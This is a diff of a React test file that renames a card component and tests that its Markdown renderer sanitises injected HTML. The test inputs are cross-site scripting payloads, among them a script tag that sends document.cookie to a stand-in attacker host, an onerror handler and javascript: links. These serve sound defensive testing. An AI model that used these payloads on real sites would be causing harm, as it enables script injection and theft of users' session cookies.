@@ -1,14 +1,11 @@
 import { describe, expect, it } from 'vitest';
 import { render, screen } from '@testing-library/react';
-import { RenderedCardContent } from '../src/index';
+import { CardContent } from '../src/index';
 
-describe('RenderedCardContent', () => {
+describe('CardContent', () => {
   it('renders the Markdown, parsed', () => {
     const { container } = render(
-      <RenderedCardContent
-        title="Hello"
-        markdown={'A paragraph with **bold** text.\n\n- one\n- two'}
-      />,
+      <CardContent title="Hello" markdown={'A paragraph with **bold** text.\n\n- one\n- two'} />,
     );
 
     expect(screen.getByRole('heading', { name: 'Hello' })).toBeInTheDocument();
@@ -30,7 +27,7 @@ describe('RenderedCardContent', () => {
   describe('sanitises the HTML it injects', () => {
     it('strips event-handler attributes', () => {
       const { container } = render(
-        <RenderedCardContent title="T" markdown={'<img src=x onerror="alert(document.domain)">'} />,
+        <CardContent title="T" markdown={'<img src=x onerror="alert(document.domain)">'} />,
       );
 
       const img = container.querySelector('img');
@@ -43,7 +40,7 @@ describe('RenderedCardContent', () => {
 
     it('strips javascript: hrefs while keeping the link', () => {
       const { container } = render(
-        <RenderedCardContent title="T" markdown="[click](javascript:alert(1))" />,
+        <CardContent title="T" markdown="[click](javascript:alert(1))" />,
       );
 
       // Assert the anchor survives, not just that the scheme is gone: deleting
@@ -58,7 +55,7 @@ describe('RenderedCardContent', () => {
 
     it('drops script and iframe elements entirely', () => {
       const { container } = render(
-        <RenderedCardContent
+        <CardContent
           title="T"
           markdown={
             '<script>fetch("//evil.example/"+document.cookie)</script>\n\n' +
@@ -74,7 +71,7 @@ describe('RenderedCardContent', () => {
 
     it('strips inline handlers on anchors', () => {
       const { container } = render(
-        <RenderedCardContent title="T" markdown={'<a href="#" onclick="alert(1)">x</a>'} />,
+        <CardContent title="T" markdown={'<a href="#" onclick="alert(1)">x</a>'} />,
       );
 
       expect(container.querySelector('a')?.getAttribute('onclick')).toBeNull();
